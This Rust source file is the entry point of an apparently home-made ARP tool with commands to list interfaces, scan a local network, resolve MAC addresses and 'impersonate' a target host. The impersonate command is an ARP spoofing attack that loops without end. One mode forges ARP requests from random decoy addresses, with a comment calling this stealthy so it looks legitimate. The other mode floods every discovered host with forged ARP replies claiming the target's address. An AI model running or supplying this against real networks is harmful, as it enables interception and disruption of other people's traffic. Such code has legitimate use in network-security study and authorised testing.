use std::time::{Duration, Instant};

use clap::Parser;
use cli::{Args, Commands};

use arprender::{arp_scan, resolve_mac, send_arp_reply, send_arp_request};
use utils::{is_timer_expired, random_ip_in_network};

pub mod arprender;
pub mod cli;
pub mod utils;

fn main() {
    let args = Args::parse();

    match args.cmd {
        Commands::Interfaces => {
            let interfaces = arprender::nic::get_interfaces();
            for interface in interfaces {
                println!(
                    "{} @ {}",
                    interface.name(),
                    match interface.mac() {
                        Some(addr) => addr.to_string(),
                        None => "None".to_string(),
                    }
                );
            }
        }
        Commands::Scan {
            interface: interface_name,
        } => match arprender::nic::get_interface_by_name(&interface_name) {
            Ok(interface) => match arp_scan(&interface, Duration::from_secs(5)) {
                Ok(hosts) => {
                    for host in &hosts {
                        println!("Found {} @ {}", host.0, host.1);
                    }
                }
                Err(err) => {
                    println!("{}", err.to_string());
                }
            },
            Err(err) => {
                println!("{}", err.to_string());
                std::process::exit(1);
            }
        },
        Commands::Resolve { interface, address } => {
            match arprender::nic::get_interface_by_name(&interface) {
                Ok(interface) => match resolve_mac(&interface, address, Duration::from_secs(10)) {
                    Ok(mac) => match mac {
                        Some(mac) => {
                            println!("IP {} has MAC address {}", address, mac);
                        }
                        None => {
                            println!("Failed to resolve address!");
                        }
                    },
                    Err(err) => {
                        println!("{}", err.to_string());
                        std::process::exit(1);
                    }
                },
                Err(err) => {
                    println!("{}", err.to_string());
                    std::process::exit(1);
                }
            }
        }
        Commands::Impersonate {
            target,
            interface,
            stealthy,
            period,
        } => {
            match arprender::nic::get_interface_by_name(&interface) {
                Ok(interface) => {
                    let period = Duration::from_secs(period.into());

                    if stealthy {
                        let Some(net) = interface.network() else {
                            eprintln!("Interface not connected to a network.");
                            std::process::exit(1);
                        };

                        let mut start = Instant::now();
                        
                        // Generate a random IP in the range of the network to make the ARP request look legitimate.
                        let attack = || {
                            let decoy_ip = loop {
                                let random_ip = random_ip_in_network(net);

                                // Ensure that the random IP is different from the target in order to prevent any interference from a potential ARP response from the target.
                                if random_ip.ne(&target) {
                                    break random_ip;
                                }
                            };

                            send_arp_request(&interface, decoy_ip, None, Some(target)).unwrap();
                        };

                        attack();
                        loop {
                            if is_timer_expired(start, period) {
                                start = Instant::now();

                                attack();
                            }
                        }
                    } else {
                        // Perform an ARP scan to detect the available hosts on the network.
                        match arp_scan(&interface, Duration::from_secs(10)) {
                            Ok(hosts) => {
                                let attack = || {
                                    for host in &hosts {
                                        send_arp_reply(&interface, host.1, host.0, None, Some(target)).unwrap();
                                    }
                                };

                                let mut start = Instant::now();
                                attack();

                                loop {
                                    if is_timer_expired(start, period) {
                                        start = Instant::now();
        
                                        attack();
                                    }
                                }
                            },
                            Err(err) => { eprintln!("{}", err.to_string()); std::process::exit(1); }
                        }


                    }
                }
                Err(err) => {
                    println!("{}", err.to_string());
                    std::process::exit(1);
                }
            }
        }
    }
}
